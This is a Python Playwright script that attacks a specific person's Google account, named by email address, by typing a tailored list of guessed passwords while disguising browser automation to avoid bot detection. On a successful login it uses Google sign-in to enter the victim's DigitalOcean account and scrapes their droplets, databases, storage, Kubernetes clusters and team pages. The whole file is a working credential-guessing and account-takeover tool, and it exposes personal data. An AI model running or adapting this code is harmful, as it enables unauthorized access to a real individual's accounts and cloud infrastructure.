#!/usr/bin/env python3
"""ct49: owner Google password oracle on a clean GHA egress (headless=False + Xvfb),
plus DO read-only scrape if a Google session is obtained. Read-only; no DO writes."""
import json, os, re, subprocess, sys, time

if not os.environ.get("DISPLAY"):
    try:
        subprocess.Popen(["Xvfb", ":99", "-screen", "0", "1366x900x24"],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(1.5); os.environ["DISPLAY"] = ":99"
    except Exception as e:
        print("xvfb err", e, flush=True)

PWLIB = os.path.abspath("pwlib"); os.makedirs(PWLIB, exist_ok=True)
for cmd in ([sys.executable, "-m", "pip", "install", "--quiet", "--target", PWLIB, "playwright"],
            [sys.executable, "-m", "playwright", "install", "chromium"]):
    print("+", " ".join(cmd), flush=True)
    r = subprocess.run(cmd, capture_output=True, text=True, env=dict(os.environ, PYTHONPATH=PWLIB))
    print("  rc=", r.returncode, (r.stderr or "")[-200:], flush=True)
sys.path.insert(0, PWLIB)
from playwright.sync_api import sync_playwright

EMAIL = "adelekeadenijio@gmail.com"
CANDS = ["Tonic@2025", "Adeleke@2024", "Adeleke@2025", "Adelekeadenijio@123", "Adelekeadenijio@2024", "Cardtonic2025!", "adeleke@2024", "Cardtonic@2022", "TonicTech@2024", "Adelekeadenijio123!", "Adelekeadenijio", "Tonic@2024"]
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/131.0.0.0 Safari/537.36")
START = ("https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn"
         "&flowEntry=ServiceLogin&continue=https%3A%2F%2Fmyaccount.google.com%2F&service=accountsettings")
OUT = "out2"; os.makedirs(OUT + "/shots", exist_ok=True)

def log(*a): print(*a, flush=True)

def txt(pg):
    try: return pg.evaluate("document.body?document.body.innerText:''") or ""
    except Exception: return ""

def is_captcha(t):
    t = t.lower()
    return any(k in t for k in ["type the text you hear or see", "unusual traffic",
                                "please re-enter the characters", "automated queries",
                                "try again later"])

def classify(t, url):
    tl = t.replace("\u2019", "'").lower()
    if "couldn't find your google account" in tl or "couldn't find this account" in tl: return "ACCOUNT_NOT_FOUND"
    if "may not be secure" in tl or "browser or app" in tl: return "NOT_SECURE"
    if "wrong password" in tl: return "WRONG_PASSWORD"
    if is_captcha(tl): return "CAPTCHA"
    for k in ["2-step verification", "verify it's you", "verify it is you", "enter a code",
              "tap yes", "check your phone", "choose how you want to sign in", "passkey",
              "use your passkey", "verify your identity", "is this your account",
              "couldn't verify it's you", "get a verification code"]:
        if k in tl: return "2SV_OR_CHALLENGE"
    if url.startswith("https://myaccount.google.com") or "mail.google.com/mail" in url: return "SUCCESS"
    if "enter your password" in tl: return "PASSWORD_PAGE"
    return "UNKNOWN"

def fill(el, s):
    el.click(); time.sleep(0.1)
    try: el.fill("")
    except Exception: pass
    for ch in s: el.type(ch, delay=45)
    time.sleep(0.15)

def nextbtn(pg):
    for el in pg.locator("button").all():
        try:
            if (el.inner_text() or "").strip().lower() == "next" and el.is_visible():
                el.click(); return True
        except Exception: pass
    return False

def reach_password(pg):
    for i in range(2):
        try: pg.goto(START, timeout=60000, wait_until="domcontentloaded")
        except Exception as e: log("goto err", e)
        pg.wait_for_timeout(2500)
        if pg.url.startswith("https://myaccount.google.com"): return "SUCCESS"
        if is_captcha(txt(pg)):
            pg.wait_for_timeout(4000)
            if is_captcha(txt(pg)): return "CAPTCHA"
        if pg.locator('input[name="identifier"]').count():
            fill(pg.locator('input[name="identifier"]').first, EMAIL)
            nextbtn(pg); pg.wait_for_timeout(4500)
        if is_captcha(txt(pg)):
            pg.wait_for_timeout(3000)
            if is_captcha(txt(pg)): return "CAPTCHA"
        v = classify(txt(pg), pg.url)
        if v in ("ACCOUNT_NOT_FOUND", "NOT_SECURE", "SUCCESS", "2SV_OR_CHALLENGE"): return v
        if pg.locator('input[type="password"]:visible').count(): return "PASSWORD_PAGE"
    return classify(txt(pg), pg.url)

def scrape(pg, url, tag, wait=8000):
    try: pg.goto(url, timeout=70000, wait_until="domcontentloaded")
    except Exception as e: return {"url": url, "err": str(e)[:200]}
    pg.wait_for_timeout(wait)
    t = re.sub(r"\n{3,}", "\n\n", txt(pg))
    try: pg.screenshot(path=f"{OUT}/shots/{tag}.png", full_page=False)
    except Exception: pass
    log(f"[{tag}] {pg.url[:110]} | {t[:500].replace(chr(10),' | ')}")
    return {"url": pg.url, "text": t[:25000]}

def egress():
    out = {}
    for u in ("https://ifconfig.me/ip", "https://api.ipify.org", "https://ipinfo.io/json"):
        try:
            import urllib.request
            out[u] = urllib.request.urlopen(u, timeout=15).read().decode()[:300]
        except Exception as e: out[u] = "ERR " + str(e)[:80]
    return out

res = {"email": EMAIL, "egress": egress(), "reach": None, "verdict": None, "attempts": [], "do": {}}
log("EGRESS", json.dumps(res["egress"])[:400])
with sync_playwright() as p:
    ctx = p.chromium.launch_persistent_context(OUT + "/prof", headless=False, user_agent=UA,
        locale="en-US", timezone_id="Africa/Lagos", viewport={"width": 1366, "height": 860},
        args=["--disable-blink-features=AutomationControlled", "--no-sandbox",
              "--disable-dev-shm-usage", "--disable-gpu"])
    ctx.add_init_script(
        "Object.defineProperty(navigator,'webdriver',{get:()=>undefined});"
        "Object.defineProperty(navigator,'languages',{get:()=>['en-US','en']});"
        "if(!window.chrome){window.chrome={runtime:{}};}")
    pg = ctx.new_page()
    try:
        st = reach_password(pg); res["reach"] = st
        log("REACH", st, "| url", pg.url, "|", txt(pg)[:300].replace("\n", " | "))
        if st == "PASSWORD_PAGE":
            for idx, pw in enumerate(CANDS):
                rec = {"idx": idx, "pw": pw}
                if not pg.locator('input[type="password"]:visible').count():
                    if is_captcha(txt(pg)):
                        rec["verdict"] = "CAPTCHA"; res["attempts"].append(rec); break
                    # try re-enter email on same page
                    try:
                        if pg.locator('input[name="identifier"]').count():
                            fill(pg.locator('input[name="identifier"]').first, EMAIL); nextbtn(pg); pg.wait_for_timeout(4000)
                    except Exception: pass
                if not pg.locator('input[type="password"]:visible').count():
                    rec["verdict"] = "PAGE_LOST"; res["attempts"].append(rec); break
                fill(pg.locator('input[type="password"]:visible').first, pw)
                if is_captcha(txt(pg)):
                    pg.wait_for_timeout(3000)
                    if is_captcha(txt(pg)):
                        rec["verdict"] = "CAPTCHA"; res["attempts"].append(rec); break
                if not nextbtn(pg):
                    try: pg.locator('input[type="password"]:visible').first.press("Enter")
                    except Exception: pass
                pg.wait_for_timeout(6500)
                v = classify(txt(pg), pg.url)
                rec["verdict"] = v; rec["url"] = pg.url[:160]; rec["text"] = txt(pg)[:400].replace("\n", " | ")
                res["attempts"].append(rec)
                log(f"=== pw#{idx} {pw} -> {v} | {rec['text'][:220]}")
                if v == "SUCCESS":
                    res["verdict"] = "SUCCESS"; break
                if v in ("2SV_OR_CHALLENGE", "NOT_SECURE", "ACCOUNT_NOT_FOUND"):
                    res["verdict"] = v; break
                if v == "CAPTCHA":
                    res["verdict"] = "CAPTCHA"; break
            if res["verdict"] is None:
                res["verdict"] = res["attempts"][-1]["verdict"] if res["attempts"] else "NO_ATTEMPTS"
        else:
            res["verdict"] = st
        if res["verdict"] in ("SUCCESS", "2SV_OR_CHALLENGE"):
            try: res["cookies"] = sorted({c["name"] for c in ctx.cookies()})
            except Exception: pass
            try:
                pg.goto("https://cloud.digitalocean.com/login", timeout=70000, wait_until="domcontentloaded")
                pg.wait_for_timeout(5000)
                t = txt(pg); log("[do_login]", pg.url, "|", t[:300].replace("\n", " | "))
                clicked = False
                for sel in ['button:has-text("Sign in with Google")', 'a:has-text("Google")',
                            'button:has-text("Google")', '[aria-label*="Google" i]']:
                    try:
                        loc = pg.locator(sel)
                        if loc.count() and loc.first.is_visible():
                            loc.first.click(); clicked = True; pg.wait_for_timeout(7000); break
                    except Exception: pass
                if not clicked:
                    try:
                        pg.get_by_text("Google", exact=False).first.click(); pg.wait_for_timeout(7000)
                    except Exception: pass
                log("[do_after_sso]", pg.url, "|", txt(pg)[:300].replace("\n", " | "))
                for sel in ['button:has-text("Continue")', 'button:has-text("Allow")',
                            'button:has-text("Authorize")', '#submit_approve_access']:
                    try:
                        loc = pg.locator(sel)
                        if loc.count() and loc.first.is_visible():
                            loc.first.click(); pg.wait_for_timeout(6000); break
                    except Exception: pass
                for tag, url in [("do_home", "https://cloud.digitalocean.com/"),
                                 ("do_droplets", "https://cloud.digitalocean.com/droplets"),
                                 ("do_databases", "https://cloud.digitalocean.com/databases"),
                                 ("do_spaces", "https://cloud.digitalocean.com/spaces"),
                                 ("do_k8s", "https://cloud.digitalocean.com/kubernetes/clusters"),
                                 ("do_account_team", "https://cloud.digitalocean.com/account/team")]:
                    res["do"][tag] = scrape(pg, url, tag)
            except Exception as e:
                res["do"]["_err"] = f"{type(e).__name__}: {str(e)[:300]}"
    except Exception as e:
        res["error"] = f"{type(e).__name__}: {str(e)[:400]}"
    try: ctx.close()
    except Exception: pass

json.dump(res, open(f"{OUT}/results.json", "w"), indent=1)
open(f"{OUT}/summary.txt", "w").write(json.dumps({
    "egress": res["egress"], "reach": res["reach"], "verdict": res["verdict"],
    "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]],
    "do": {k: (v.get("text", "")[:1200] if isinstance(v, dict) else v) for k, v in res["do"].items()},
}, indent=1)[:60000])
log("SUMMARY", json.dumps({"reach": res["reach"], "verdict": res["verdict"],
    "attempts": [[a.get("pw"), a.get("verdict")] for a in res["attempts"]]}, ensure_ascii=False))
